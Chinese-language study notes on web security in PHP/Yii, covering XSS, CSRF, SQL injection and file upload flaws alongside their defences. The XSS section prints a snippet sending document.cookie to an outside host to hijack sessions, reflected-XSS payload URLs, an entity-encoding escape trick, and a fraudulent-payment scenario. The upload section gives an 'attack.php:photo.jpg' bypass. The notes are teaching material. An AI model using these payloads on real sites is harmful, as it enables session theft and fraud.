# XSS 攻击
Cross Site Scripting 简称XSS

```
var cookie = document.cookie;
window.location.href = 'http://codekissyoung.com?cookie='+cookie;
```
通过上面代码我可以拿到别的用户的cookie,我可以将这个用户的cookie放入我自己的浏览器，再去访问该cookie对应的网站，我就伪装成了该用户^_^
### httponly
服务器给发送给浏览器的cookie设置了httponly,我们就没办法通过javascript拿到用户cookie了

### 如何能让我写的javascript攻击代码在被攻击的网站／页面运行呢？
也就是如何将攻击代码注入到攻击页面中呢？
###反射型Xss
```
http://www.codekissyoung.com?name=<script>alert('aaaa');</script>
```
浏览器在`X-XSS-protectioiin`没开启的情况下，会运行链接里的<script>中的代码
```
\YII::$app->response->headers->add('X-XSS-Protection', '0'); // 不开启浏览器X-XSS-Protection
```
构建下面链接(假设是付款页面的url),...是攻击代码
```
http://taobao.com?user=zhangjian&js=<script>...</script>
```
将该链接发布到网上,引诱别人点击,如果真有用户在该付款页面登录了，他点了上述链接后会跳转到该url,同时执行里面的js代码(js可以自动填写表单，收款人填自己，同时自动点击付款)^_^
### 攻击的难点和精髓就在于如何让自己js能运行起来
url编码知识:`&`编码是`％26`,`escape("&")`可以得到编码值
html实体编码知识: `"`的实体编码为`&quot;`
`&quot;`生成的`"`能越狱么？
在`<script>`标签中，`&quot;`不会被html解析为`"`的
`<?=$_GET['key'];?>`接收的为 `?key=%26quot;alert(3);//`
```
<img src="x" onerror='var a = "123<?=$_GET['key'];?>"'/>
```
### Yii 防止Xss
```
\yii\helpers\Html::encode($script);
\yii\helpers\HtmlPurifier::process($script); // lexer(词法解析)出js代码，然后过滤它
```
为何不用正则表达式过滤js代码？
js代码可能隐藏在`<img>``<a>`中，各种属性中，并且掺杂各种编码，你很难识别全部伪装的js代码


# Csrf 跨站脚本攻击
get请求，post请求不是来自本站点
## get型
比如有一个url`http://codekissyoung.com/article/delete?id=19`是用于删除一篇文章的，我将这个链接发布到网上，任何人点击了该链接都可以触发删除文章代码(如果未防范的话)
## post型
伪造表单，action填写真实攻击网站的url,诱导用户填写表单，在用户已经登录该网站(有cookie)的情况下，他填写我们伪造的表单，然后提交，就中招了！
## referer
通过referer头防csrf,但不靠谱，有些浏览器不带referer头
## 防伪标志
服务器生成一个防伪标志_csrf给每个请求的页面，页面里面提交表单时，需要将_csrf传递过来，服务器验证该_csrf是否正确
Yii框架生成 _csrf标志
```
$csrfToken = \Yii::$app->request->csrfToken;
$this->render('view',['csrfToken'=>$csrfToken]);
```
view中
```
<form>
<input type='hidden' name="_csrf" value='<?=$csrfToken?>'>
</form>
```
_csrf的验证过程
服务端在返回页面时，表单带上隐藏的_csrf,cookie设置上经过加密算法加密的_csrf
再次请求服务端时，判断下 `加密(表单_csrf) == cookie的_csrf`就可以验证请求是否伪造的了


# SQL注入
```
$user = (new \yii\db\Query())
->select('*')
->from('users')
->where('name=:name', ['name'=>'zhangsan'])
->one();
print_r($user);
```

# 文件上传漏洞
验证上传文件类型
防止文件名上做手脚
```
if($_POST){
$ext = pathinfo($_FILES['photo']['name'], PATHINFO_EXTENSION);
if(in_array($ext, ['png', 'jpg', 'gif'])){

echo '类型检测成功';
move_uploaded_file($_FILES['photo']['tmp_name'], './'.$_FILES['photo']['name']);
}

//$_FILES['photo']['type']
}
```
比如 `attack.php:photo.jpg`在服务端可以绕过类型检测，但是操作系统文件名的限制，该文件会被存为
`attack.php`,`:`后面都会被截断
所有建议不使用用户提交的文件名存储文件！而是使用服务器端生成的文件！
